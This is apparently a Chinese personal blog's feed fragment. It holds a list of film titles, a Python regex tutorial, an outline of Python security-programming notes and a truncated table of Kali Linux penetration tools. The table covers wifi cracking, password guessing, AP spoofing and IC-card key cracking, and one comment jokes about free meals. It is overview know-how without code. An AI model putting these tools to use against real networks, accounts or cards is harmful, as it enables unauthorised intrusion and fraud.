&#39;无间道&#39;, &#39;龙猫&#39;, &#39;教父&#39;, &#39;当幸福来敲门&#39;, &#39;怦然心动&#39;, &#39;触不可及&#39;, &#39;蝙蝠侠：黑暗骑士&#39;, &#39;控方证人&#39;, &#39;活着&#39;, &#39;乱世佳人&#39;, &#39;寻梦环游记&#39;, &#39;末代皇帝&#39;, &#39;摔跤吧！爸爸&#39;, &#39;指环王3：王者无敌&#39;, &#39;少年派的奇幻漂流&#39;, &#39;何以为家&#39;, &#39;飞屋环游记&#39;, &#39;十二怒汉&#39;, &#39;鬼子来了&#39;, &#39;天空之城&#39;, &#39;大话西游之月光宝盒&#39;, &#39;哈尔的移动城堡&#39;, &#39;素媛&#39;, &#39;天堂电影院&#39;, &#39;罗马假日&#39;, &#39;闻香识女人&#39;, &#39;辩护人&#39;, &#39;搏击俱乐部&#39;, &#39;哈利·波特与魔法石&#39;, &#39;我不是药神&#39;, &#39;死亡诗社&#39;, &#39;教父2&#39;, &#39;狮子王&#39;, &#39;指环王2：双塔奇兵&#39;, &#39;窃听风暴&#39;, &#39;大闹天宫&#39;, &#39;指环王1：魔戒再现&#39;, &#39;两杆大烟枪&#39;, &#39;美丽心灵&#39;, &#39;饮食男女&#39;, &#39;飞越疯人院&#39;, &#39;猫鼠游戏&#39;, &#39;黑客帝国&#39;, &#39;V字仇杀队&#39;, &#39;钢琴家&#39;, &#39;本杰明·巴顿奇事&#39;, &#39;看不见的客人&#39;, &#39;让子弹飞&#39;, &#39;西西里的美丽传说&#39;, &#39;海豚湾&#39;, &#39;小鞋子&#39;, &#39;拯救大兵瑞恩&#39;, &#39;情书&#39;, &#39;穿条纹睡衣的男孩&#39;, &#39;音乐之声&#39;, &#39;美国往事&#39;, &#39;绿皮书&#39;, &#39;致命魔术&#39;, &#39;海蒂和爷爷&#39;, &#39;低俗小说&#39;, &#39;七宗罪&#39;, &#39;沉默的羔羊&#39;, &#39;蝴蝶效应&#39;, &#39;春光乍泄&#39;, &#39;被嫌弃的松子的一生&#39;, &#39;禁闭岛&#39;, &#39;心灵捕手&#39;, &#39;布达佩斯大饭店&#39;, &#39;阿凡达&#39;, &#39;剪刀手爱德华&#39;, &#39;勇敢的心&#39;, &#39;摩登时代&#39;, &#39;天使爱美丽&#39;, &#39;喜剧之王&#39;, &#39;加勒比海盗&#39;, &#39;致命ID&#39;, &#39;断背山&#39;, &#39;杀人回忆&#39;, &#39;幽灵公主&#39;, &#39;狩猎&#39;, &#39;阳光灿烂的日子&#39;, &#39;请以你的名字呼唤我&#39;, &#39;入殓师&#39;, &#39;哈利·波特与死亡圣器(下)&#39;, &#39;重庆森林&#39;, &#39;第六感&#39;, &#39;小森林 夏秋篇&#39;, &#39;7号房的礼物&#39;, &#39;消失的爱人&#39;, &#39;红辣椒&#39;, &#39;爱在黎明破晓前&#39;, &#39;小森林 冬春篇&#39;, &#39;玛丽和马克思&#39;, &#39;侧耳倾听&#39;, &#39;一一&#39;, &#39;告白&#39;, &#39;唐伯虎点秋香&#39;, &#39;大鱼&#39;, &#39;蝙蝠侠：黑暗骑士崛起&#39;, &#39;阳光姐妹淘&#39;, &#39;倩女幽魂&#39;, &#39;超脱&#39;, &#39;射雕英雄传之东成西就&#39;, &#39;甜蜜蜜&#39;, &#39;驯龙高手&#39;, &#39;萤火之森&#39;, &#39;超能陆战队&#39;, &#39;无人知晓&#39;, &#39;幸福终点站&#39;, &#39;菊次郎的夏天&#39;, &#39;恐怖直播&#39;, &#39;借东西的小人阿莉埃蒂&#39;, &#39;爱在日落黄昏时&#39;, &#39;神偷奶爸&#39;, &#39;完美的世界&#39;, &#39;怪兽电力公司&#39;, &#39;玩具总动员3&#39;, &#39;风之谷&#39;, &#39;血战钢锯岭&#39;, &#39;傲慢与偏见&#39;, &#39;上帝之城&#39;, &#39;功夫&#39;, &#39;时空恋旅人&#39;, &#39;教父3&#39;, &#39;电锯惊魂&#39;, &#39;喜宴&#39;, &#39;谍影重重3&#39;, &#39;英雄本色&#39;, &#39;天书奇谭&#39;, &#39;人生果实&#39;, &#39;岁月神偷&#39;, &#39;被解救的姜戈&#39;, &#39;七武士&#39;, &#39;哪吒闹海&#39;, &#39;我是山姆&#39;, &#39;疯狂原始人&#39;, &#39;纵横四海&#39;, &#39;三块广告牌&#39;, &#39;头号玩家&#39;, &#39;心迷宫&#39;, &#39;萤火虫之墓&#39;, &#39;真爱至上&#39;, &#39;达拉斯买家俱乐部&#39;, &#39;釜山行&#39;, &#39;荒蛮故事&#39;, &#39;东邪西毒&#39;, &#39;贫民窟的百万富翁&#39;, &#39;记忆碎片&#39;, &#39;爆裂鼓手&#39;, &#39;黑天鹅&#39;, &#39;你的名字。&#39;, &#39;花样年华&#39;, &#39;卢旺达饭店&#39;, &#39;忠犬八公物语&#39;, &#39;哈利·波特与阿兹卡班的囚徒&#39;, &#39;头脑特工队&#39;, &#39;黑客帝国3：矩阵革命&#39;, &#39;模仿游戏&#39;, &#39;一个叫欧维的男人决定去死&#39;, &#39;雨人&#39;, &#39;你看起来好像很好吃&#39;, &#39;无敌破坏王&#39;, &#39;未麻的部屋&#39;, &#39;恋恋笔记本&#39;, &#39;冰川时代&#39;, &#39;哈利·波特与密室&#39;, &#39;海街日记&#39;, &#39;新世界&#39;, &#39;海边的曼彻斯特&#39;, &#39;二十二&#39;, &#39;虎口脱险&#39;, &#39;房间&#39;, &#39;恐怖游轮&#39;, &#39;惊魂记&#39;, &#39;人工智能&#39;, &#39;雨中曲&#39;, &#39;魔女宅急便&#39;, &#39;奇迹男孩&#39;, &#39;疯狂的石头&#39;, &#39;罗生门&#39;, &#39;海洋&#39;, &#39;爱在午夜降临前&#39;, &#39;终结者2：审判日&#39;, &#39;燃情岁月&#39;, &#39;魂断蓝桥&#39;, &#39;小偷家族&#39;, &#39;初恋这件小事&#39;, &#39;穿越时空的少女&#39;, &#39;可可西里&#39;, &#39;绿里奇迹&#39;, &#39;2001太空漫游&#39;, &#39;完美陌生人&#39;, &#39;牯岭街少年杀人事件&#39;, &#39;无耻混蛋&#39;, &#39;阿飞正传&#39;, &#39;城市之光&#39;, &#39;新龙门客栈&#39;, &#39;源代码&#39;, &#39;香水&#39;, &#39;谍影重重2&#39;, &#39;青蛇&#39;, &#39;谍影重重&#39;, &#39;地球上的星星&#39;, &#39;战争之王&#39;, &#39;猜火车&#39;, &#39;血钻&#39;, &#39;色，戒&#39;, &#39;遗愿清单&#39;, &#39;大佛普拉斯&#39;, &#39;朗读者&#39;, &#39;浪潮&#39;, &#39;步履不停&#39;, &#39;彗星来的那一夜&#39;, &#39;疯狂的麦克斯4：狂暴之路&#39;, &#39;小萝莉的猴神大叔&#39;, &#39;再次出发之纽约遇见你&#39;, &#39;聚焦&#39;, &#39;驴得水&#39;, &#39;东京物语&#39;, &#39;追随&#39;, &#39;一次别离&#39;, &#39;我爱你&#39;, &#39;千钧一发&#39;, &#39;黑鹰坠落&#39;, &#39;九品芝麻官&#39;, &#39;四个春天&#39;, &#39;发条橙&#39;, &#39;网络谜踪&#39;, &#39;E.T. 外星人&#39;, &#39;哈利·波特与火焰杯&#39;, &#39;撞车&#39;]</code></pre>]]></content>
      
      
      <categories>
          
          <category> Python安全编程 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python正则表达式</title>
      <link href="2020/04/11/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
      <url>2020/04/11/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<p>本文学习正则表达式以及正则表达式如何在Python中使用。</p><a id="more"></a><h2 id="Python-正则表达式"><a href="#Python-正则表达式" class="headerlink" title="Python 正则表达式"></a>Python 正则表达式</h2><p>正则：对字符串的检索匹配和处理。</p><p>Python通过re模块提供对正则表达式的支持：</p><ol><li>先将正则表达式的字符串形式编译为Pattern实例</li><li>使用Pattern实例处理文本并获取匹配结果</li><li>使用实例获取信息，进行其他操作</li></ol><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gdq3wqn5y0j313k0fqgrw.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1gdq3wqn5y0j313k0fqgrw.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200411203652438"></p><p>一个简单的实例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line">match = pattern.match(<span class="string">&#x27;hello world&#x27;</span>)</span><br><span class="line">print(match.group())</span><br></pre></td></tr></table></figure><p>或者采取一种更简便的方式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">word = re.findall(<span class="string">&#x27;hello&#x27;</span>, <span class="string">&#x27;hello world!&#x27;</span>)</span><br><span class="line">print(word)</span><br></pre></td></tr></table></figure><h2 id="正则表达式常用字符"><a href="#正则表达式常用字符" class="headerlink" title="正则表达式常用字符"></a>正则表达式常用字符</h2><ol><li>利用<code>.</code>匹配任意单字符（仅一位）</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">word = <span class="string">&quot;http://murraynizeyu.github.io python-exec&quot;</span></span><br><span class="line">key = re.findall(<span class="string">&#x27;h.&#x27;</span>,word)</span><br><span class="line">print(key) <span class="comment">#[&#x27;ht&#x27;, &#x27;hu&#x27;, &#x27;ho&#x27;]</span></span><br></pre></td></tr></table></figure><ol start="2"><li>利用<code>\</code>匹配被转义的字符</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">word = <span class="string">&quot;http://murraynizeyu.github.io python-exec&quot;</span></span><br><span class="line">key = re.findall(<span class="string">&#x27;\...&#x27;</span>,word)</span><br><span class="line">print(key) <span class="comment">#[&#x27;.gi&#x27;, &#x27;.io&#x27;]</span></span><br></pre></td></tr></table></figure><ol start="3"><li>利用<code>[xxx]</code>匹配中任意单字符（仅一位）<ul><li><code>^</code>取反操作：<code>[^abc]</code>表示匹配不是abc的其他字符</li><li>所有的特殊字符（]、[、-、^）在字符集中都失去原有的特殊含义，需要加上<code>\</code>防止转义。</li></ul></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">word = <span class="string">&quot;http://murraynizeyu.gitnuz.io python-exec&quot;</span></span><br><span class="line">key = re.findall(<span class="string">&#x27;n[ui]z&#x27;</span>,word)</span><br><span class="line">print(key) <span class="comment">#[&#x27;niz&#x27;, &#x27;nuz&#x27;]</span></span><br></pre></td></tr></table></figure><center>预定义字符集（写在pattern中）</center><table><thead><tr><th>字符</th><th>意义</th></tr></thead><tbody><tr><td><code>\d</code></td><td>数字=<code>[0-9]</code></td></tr><tr><td><code>\D</code></td><td>非数字=<code>[^\d]</code></td></tr><tr><td><code>\s</code></td><td>非空字符=<code>[&lt;space&gt;\t\r\f\v]</code></td></tr><tr><td><code>\S</code></td><td>非空白字符（除了空格）=<code>[^\s]</code></td></tr><tr><td><code>\w</code></td><td>单词字符=<code>[A-Za-z0-9]</code></td></tr><tr><td><code>\W</code></td><td>非单词字符=<code>[^\w]</code></td></tr></tbody></table><center>预定义字符集（写在字符后）</center><table><thead><tr><th>字符</th><th>意义</th></tr></thead><tbody><tr><td><code>*</code></td><td>匹配前一个字符0次或无限次</td></tr><tr><td><code>+</code></td><td>匹配前一个字符1次或无限次</td></tr><tr><td><code>?</code></td><td>匹配前一个字符0次或1次</td></tr><tr><td><code>&#123;m&#125;</code></td><td>匹配前一个字符m次</td></tr><tr><td><code>&#123;m,n&#125;</code></td><td>匹配前一个字符m次至n次</td></tr></tbody></table><center>逻辑、分组</center><table><thead><tr><th>字符</th><th>意义</th></tr></thead><tbody><tr><td>I</td><td>代表左右表达式任意匹配一个（先匹配左边后右边）</td></tr><tr><td>(…)</td><td>被括起来的表达式将作为一个分组</td></tr></tbody></table><h2 id="贪婪模式与非贪婪模式"><a href="#贪婪模式与非贪婪模式" class="headerlink" title="贪婪模式与非贪婪模式"></a>贪婪模式与非贪婪模式</h2><p>正则表达式通常用于在文本中查找匹配的字符串。Python里的数量词默认是贪婪的，就是尝试匹配尽量可能多的字符。非贪婪则相反，总是匹配尽可能少的字符。</p><p>举个粟子：</p><p>给出一个正则表达式<code>&quot;ab*&quot;</code>用户查找<code>&quot;abbbc&quot;</code>。</p><p>在贪婪模式下，将找到”abbbc”；在非贪婪模式下（<code>&quot;ab*?&quot;</code>）,将找到”a”。</p><h2 id="正则表达式常用Pattern"><a href="#正则表达式常用Pattern" class="headerlink" title="正则表达式常用Pattern"></a>正则表达式常用Pattern</h2><p>1.匹配中文字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[\u4e00-\u9fa5]</span><br></pre></td></tr></table></figure><p>2.匹配双字节字符（包括汉字在内）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[^\x00-\xff]</span><br></pre></td></tr></table></figure><p>3.匹配空白行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\n\s*\r</span><br></pre></td></tr></table></figure><p>4.匹配Email地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[\w!#$%&amp;&#39;*+&#x2F;&#x3D;?^_&#96;&#123;|&#125;~-]+(?:\.[\w!#$%&amp;&#39;*+&#x2F;&#x3D;?^_&#96;&#123;|&#125;~-]+)*@(?:[\w](?:[\w-]*[\w])?\.)+[\w](?:[\w-]*[\w])?</span><br></pre></td></tr></table></figure><p>5.匹配网址URL </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[a-zA-z]+:&#x2F;&#x2F;[^\s]*</span><br></pre></td></tr></table></figure><p>6.匹配国内电话号码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\d&#123;3&#125;-\d&#123;8&#125;|\d&#123;4&#125;-\&#123;7,8&#125;</span><br></pre></td></tr></table></figure><p>7.匹配腾讯QQ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[1-9][0-9]&#123;4,&#125;</span><br></pre></td></tr></table></figure><p>8.匹配中国邮政编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[1-9]\d&#123;5&#125;(?!\d)</span><br></pre></td></tr></table></figure><p>9.匹配18位身份证号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^(\d&#123;6&#125;)(\d&#123;4&#125;)(\d&#123;2&#125;)(\d&#123;2&#125;)(\d&#123;3&#125;)([0-9]|X)$</span><br></pre></td></tr></table></figure><p>10.匹配(年-月-日)格式日期</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">([0-9]&#123;3&#125;[1-9]|[0-9]&#123;2&#125;[1-9][0-9]&#123;1&#125;|[0-9]&#123;1&#125;[1-9][0-9]&#123;2&#125;|[1-9][0-9]&#123;3&#125;)-(((0[13578]|1[02])-(0[1-9]|[12][0-9]|3[01]))|((0[469]|11)-(0[1-9]|[12][0-9]|30))|(02-(0[1-9]|[1][0-9]|2[0-8])))</span><br></pre></td></tr></table></figure><p>11.匹配整数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^-?[1-9]\d*$</span><br></pre></td></tr></table></figure><h2 id="正则表达式练习"><a href="#正则表达式练习" class="headerlink" title="正则表达式练习"></a>正则表达式练习</h2><p>爬取淘宝页面所支持国家与地区</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;https://s.taobao.com/search?q=%E6%89%8B%E6%9C%BA&amp;imgfile=&amp;commend=all&amp;ssid=s5-e&amp;search_type=item&amp;sourceId=tb.index&amp;spm=a21bo.2017.201856-taobao-item.1&amp;ie=utf8&amp;initiative_id=tbindexz_20170306&#x27;</span></span><br><span class="line">html = requests.get(url)</span><br><span class="line">re.findall(<span class="string">r&#x27;&#123;&quot;areaName&quot;:&quot;(.*?)&quot;&#x27;</span>, html.text)</span><br><span class="line"><span class="comment">#[&#x27;中国大陆&#x27;,&#x27;中国香港&#x27;,&#x27;中国澳门&#x27;...]</span></span><br></pre></td></tr></table></figure><p>在页面中国家与地区的显示格式如下<code>&#123;&quot;areaName&quot;:&quot;文莱&quot;，...&#125;</code>，因此我们设置匹配模式pattern=<code>&quot;&#123;&quot;areaName&quot;:&quot;(.*?)&quot;&quot;</code>，以非贪婪模式进行。</p>]]></content>
      
      
      <categories>
          
          <category> Python安全编程 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python安全编程</title>
      <link href="2020/04/11/Python%E5%AE%89%E5%85%A8%E7%BC%96%E7%A8%8B/"/>
      <url>2020/04/11/Python%E5%AE%89%E5%85%A8%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>暂时空</p><a id="more"></a><h2 id="Python安全编程笔记说明："><a href="#Python安全编程笔记说明：" class="headerlink" title="Python安全编程笔记说明："></a>Python安全编程笔记说明：</h2><h3 id="必备知识："><a href="#必备知识：" class="headerlink" title="必备知识："></a>必备知识：</h3><p>掌握Python基础知识</p><p>了解HTTP协议</p><p>熟练使用BurpSuite、Sqlmap工具</p><h3 id="目标知识："><a href="#目标知识：" class="headerlink" title="目标知识："></a>目标知识：</h3><p>Python高级用法： 爬虫、多线程、网络编程</p><p>Python hacker应用：扫描、爆破、POC</p><h2 id="Python黑客领域的现状"><a href="#Python黑客领域的现状" class="headerlink" title="Python黑客领域的现状"></a>Python黑客领域的现状</h2><p>基于Python的平台</p><ul><li><a href="https://www.seebug.org/">知道创宇Seebug漏洞平台</a> </li><li><a href="https://github.com/WooYun/TangScan">TangScan</a></li><li><a href="http://www.bugscan.net/">BugScan漏洞插件社区</a></li></ul><p>基于Python的工具</p><ul><li>Sqlmap</li><li>mitmproxy/mitmdump 中间人攻击</li></ul><h2 id="Python基础知识"><a href="#Python基础知识" class="headerlink" title="Python基础知识"></a>Python基础知识</h2><table><thead><tr><th>方面</th><th>说明</th></tr></thead><tbody><tr><td>Python 正则表达式</td><td>对于Web应用程序常见的漏洞，都需要正则表达式去匹配</td></tr><tr><td>Python Web编程</td><td>对爬虫理解、敏感目录扫描</td></tr><tr><td>Python 多线程编程</td><td>提升效率</td></tr><tr><td>Python 网络编程</td><td>发送一些网络数据进行攻击</td></tr><tr><td>Python 数据库编程</td><td>保存上述获取的数据</td></tr></tbody></table><p>一些简单的例子：</p><p><strong>目录扫描</strong>：Web\多线程（requests、threading、Queue）对后台、敏感文件（svn、upload）、敏感目录（phpmyadmin）</p><p> <strong>信息搜集</strong>：Web\数据库（中间件tomcat、Jboss）\C段Web信息\搜集特定程序</p><p><strong>信息匹配和SQL注入</strong>：Web\正则（抓取信息+SQL注入）</p><p><strong>反弹shell</strong>：网络</p>]]></content>
      
      
      <categories>
          
          <category> Python安全编程 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Kali工具大全</title>
      <link href="2020/04/10/Kali%E5%B7%A5%E5%85%B7%E5%A4%A7%E5%85%A8/"/>
      <url>2020/04/10/Kali%E5%B7%A5%E5%85%B7%E5%A4%A7%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<p>本文介绍渗透测试常用的Kali系统内置的一些工具。</p><a id="more"></a><table><thead><tr><th>名称</th><th>类型</th><th>使用模式</th><th>功能</th><th>功能评价</th></tr></thead><tbody><tr><td>dmitry</td><td>信息收集</td><td></td><td>whois查询/子域名收集/端口扫描</td><td>whois并不简单明了；子域名和邮箱依赖google；端口扫描速度一般</td></tr><tr><td>dnmap</td><td>信息收集</td><td></td><td>用于组建分布式nmap，dnmap_server为服务端；dnmap_client为客户端</td><td>用起来并不是那么方便，不是实在不行不是很必要</td></tr><tr><td>ike-scan</td><td>信息收集</td><td></td><td>收集ipsec vpn server指纹信息</td><td>好像用于攻击vpn，不太懂</td></tr><tr><td>maltegoce</td><td>信息收集</td><td></td><td>域名/账号等关联性收集展示</td><td>关联性展示功能确实很好，但效果可能没有那么理想，特别是对国内而言</td></tr><tr><td>netdiscover</td><td>信息收集</td><td></td><td>主动发出arp包和截获arp包</td><td>就arp探测功能就此功能本身而言做得算很好了</td></tr><tr><td>nmap</td><td>信息收集</td><td></td><td>端口服务探测和端口漏洞扫描</td><td>端口扫描集大成者</td></tr><tr><td>p0f</td><td>信息收集</td><td></td><td>监听网卡收发的数据包，读取远端机器操作系统服务版本等信息</td><td>毕竟只是截取数据 包中的版本信息，效果期望不要很大</td></tr><tr><td>regon-ng</td><td>信息收集</td><td></td><td>模仿msf的信息收集框架</td><td>有多个信息收集模块，暂时灭说想法恴义大于作用</td></tr><tr><td>sparta</td><td>暴力破解</td><td></td><td>图形版的hydra，加了端口服务扫描功能</td><td>还行图形界面聊胜于无</td></tr><tr><td>zenmap</td><td>信息收集</td><td></td><td>图形界面版的nmap</td><td>还行图形界面聊胜于无</td></tr><tr><td>golismero</td><td>web扫描</td><td></td><td>就是一个文本版的类似awvs的web扫描器</td><td>感觉可以提升对扫描器原理的认识</td></tr><tr><td>lynis</td><td>系统审计</td><td></td><td>感觉有点像360首页的“立即体验”，不过只是扫描告警不能一键修复</td><td>shell脚本写成颇为有趣</td></tr><tr><td>nikto</td><td>web扫描</td><td></td><td>web扫描器</td><td>就喜欢这种直接告漏洞的扫描器（不过事实上很少能有可用的漏洞）</td></tr><tr><td>unix-privesc-check</td><td>系统审计</td><td></td><td>审计系统中的关键文件权限是否有异常</td><td>还是没有总结性展示和修复功能</td></tr><tr><td>bed</td><td>系统扫描</td><td></td><td>通过发送各种模糊数据测试多种服务的缓冲区溢出漏洞的工具</td><td>可能还不错</td></tr><tr><td>burpsuite</td><td>web代理</td><td></td><td>常用web代理截包工具</td><td>功能强大不能要求更多</td></tr><tr><td>commix</td><td>注入检测</td><td></td><td>sqlmap检测sql注入此工具检测系统命令注入</td><td>两相搭配那注入基本覆盖了</td></tr><tr><td>httrack</td><td>网站克隆</td><td></td><td>将网站克隆到本地</td><td>钓鱼乌云等可能有用</td></tr><tr><td>owasp-zap</td><td>web代理</td><td></td><td>owasp组织开发的工具</td><td>感觉和burpsuite没有很大差别</td></tr><tr><td>paros</td><td>web扫描</td><td></td><td>一个web漏洞扫描器</td><td></td></tr><tr><td>skipfish</td><td>web扫描</td><td></td><td>一个全自动化的web漏洞扫描工具</td><td></td></tr><tr><td><a href="http://nizeyu.xyz/2020/03/30/SQLMAP%E4%B8%8D%E5%AE%8C%E5%85%A8%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/">sqlmap</a></td><td>sql注入扫描</td><td></td><td>一个强大的sql注入扫描工具</td><td></td></tr><tr><td>w3af</td><td>web扫描</td><td></td><td>一个web漏洞扫描框架</td><td>效果还不是很出众但是凡是框架就有活力</td></tr><tr><td>webscarab</td><td>http代理</td><td></td><td>更专业的http数扬威包分析工具</td><td></td></tr><tr><td>wpscan</td><td>web扫描</td><td></td><td>针对wordpress的漏洞扫描工具</td><td></td></tr><tr><td>bbqsql</td><td>盲注扫描</td><td>shell</td><td>一个高度可配置的交互式的sql盲注工具</td><td></td></tr><tr><td>hexorbase</td><td>数据库管理</td><td>gui</td><td>一个支持多种数据库的客户端有多个数据库的口令解解功能</td><td></td></tr><tr><td>jsql</td><td>数据库探测</td><td>gui</td><td>根据url探测数据库类型/参数注入测试/探测后台页而/探测重要文件</td><td></td></tr><tr><td>mdb-sql</td><td>数据库管理</td><td>cmd-line</td><td>可用来连接access数据库文件（mdb）然后通过sql语句查询数据</td><td></td></tr><tr><td>oscaner</td><td>数据库猜解</td><td>cmd-line</td><td>用字典探查oracle数据库是否监听及猜解服务名</td><td></td></tr><tr><td>sidguesser</td><td>数据库猜解</td><td>cmd-line</td><td>用字典探测oracle数据库存在的sid</td><td></td></tr><tr><td>sqllite database</td><td>数据库管理</td><td>gui</td><td>sqlite数据库客户端</td><td></td></tr><tr><td>sqlinja</td><td>数据库猜解</td><td>cmd-line</td><td>用于猜解ms sql</td><td></td></tr><tr><td>sqlsus</td><td>sql注入检测</td><td>cmd-line</td><td>用于mysql的盲注检测</td><td></td></tr><tr><td>tnscmd10g</td><td>数据库探测</td><td>cmd-line</td><td>用于探测oracle是否监听及其他一些信息</td><td></td></tr><tr><td>cewl</td><td>口令文件制作</td><td>cmd-line</td><td>爬取给定的URL并依据限制条件生成网站可能使用的口令集合</td><td></td></tr><tr><td>crunch</td><td>口令文件制作</td><td>cmd-line</td><td>依据限定的条件生成口令集合</td><td></td></tr><tr><td>hashcat</td><td>hash爆破</td><td>cmd-line</td><td>多种hash的爆力猜解工具，速度快所耗CPU小（相对）</td><td></td></tr><tr><td>john</td><td>系统口令破解</td><td>cmd-line</td><td>用于对系统口令文件的破解（如/etc/passwd）还原出密码明文</td><td></td></tr><tr><td>johnny</td><td>系统口令破解</td><td>gui</td><td>john的gui版本</td><td></td></tr><tr><td>medusa</td><td>口令猜解</td><td>cmd-line</td><td>可对IMAP, rlogin, SSH等进行口令猜解，类似hydra</td><td></td></tr><tr><td>ncrack</td><td>口令猜解</td><td>cmd-line</td><td>可对IMAP, rlogin, SSH等进行口令猜解，类似hydra</td><td></td></tr><tr><td>ophcrack</td><td>系统口令破解</td><td>gui</td><td>基于彩虹表的windows口令破解工具</td><td></td></tr><tr><td>pyrit</td><td>wifi破解</td><td>cmd-line</td><td>WPA/WPA2加密的wifi的密码破解工具</td><td></td></tr><tr><td>rainbowcrack</td><td>hash破解</td><td>cmd-line</td><td>具有彩虹表的生成、排序和使用排序好换彩虹表进行破解的功能</td><td></td></tr><tr><td>rcracki_mt</td><td>hash破解</td><td>cmd-line</td><td>基于彩虹表的hash破解工具，可能蚲rainbowcrack一部份</td><td></td></tr><tr><td>wordlist</td><td>口令文件</td><td>cmd-line</td><td>打印kali自带的一些口令文件存放的位置</td><td></td></tr><tr><td>aircrack-ng</td><td>wifi破解</td><td>cmd-line</td><td>针对WEP、 WPA加密方式的wifi密码破解套件</td><td></td></tr><tr><td>chirp</td><td>无线电拦截</td><td>gui</td><td>各种无线电数据包的拦截工具（？）</td><td></td></tr><tr><td>cowpatty</td><td>wifi破解</td><td>cmd-line</td><td>基于已捕获握手包和密码字典的WPA-PSK加密的wifi密码的猜解</td><td>不能自己拦截数据包也只能破解WPA-PSK类加密方式功能有点弱</td></tr><tr><td>Fern WIFI Cracker</td><td>wifi破解</td><td>gui</td><td>基于字典的WEP和WPA加密的wifi破解工具</td><td>能自动发现wifi能拦截数据包，图形界面操作，简单易用</td></tr><tr><td>Ghost Phiser</td><td>AP假冒</td><td>gui</td><td>能发现AP并使与AP连接的设备断开连接然后假冒AP让设备重新连接</td><td>图形界面除了AP外还有假冒DNS、http服务器等，较为好用</td></tr><tr><td>giskismet</td><td>可视化</td><td>gui</td><td>Kismet输出结果的可视化工具，即较成text、html等各种格式</td><td></td></tr><tr><td>kismet</td><td>AP发现</td><td>shell</td><td>交互式的AP发现工具，列出周围AP的各种信息</td><td></td></tr><tr><td><a href="http://www.360doc.com/content/15/1229/16/29791812_523958566.shtml">MDK3</a></td><td>AP扰乱</td><td>cmd-line</td><td>可向AP发送大量连接、断开请求，可向周围设备告知存在根本不存在的大量AP</td><td>这工具的攻击方法简直是发了疯</td></tr><tr><td>mfor</td><td>IC卡破解</td><td>cmd-line</td><td>IC卡密钥破解程序</td><td>各种免费吃饭充钱教程里用的工具你想不想学</td></tr><tr><td>mfterm</td><td>IC卡破解</td><td>shell</td><td>交互式IC卡文件写入工具</td><td>要修改卡内数据才是最终的IC卡破解</td></tr><tr><td>pixiewps</td><td>wifi破解</td><td>cmd-line</td><td>针对开启WPS的wifi利用WPS随机数生成中的bug来破解</td><td>有说很快有说成功率比较低</td></tr><tr><td>reaver</td><td>wifi破解</td><td>cmd-line</td><td>针对开启WPS的wifi进行暴力破解的工具</td><td>aircrack-ng后排名第二的wifi破解工具</td></tr><tr><td>wifite</td><td>wifi破解</td><td>cmd-line</td><td>较为自动化的wifi破解工具</td><td></td></tr><tr><td>apktool</td><td>安卓逆向</td><td>cmd-line</td><td>从apk文件中还原出xml和图版等资源文件</td><td></td></tr><tr><td>clang</td><td>编译器</td><td>cmd-line</td><td>类似gcc的编译器，更轻量，可编译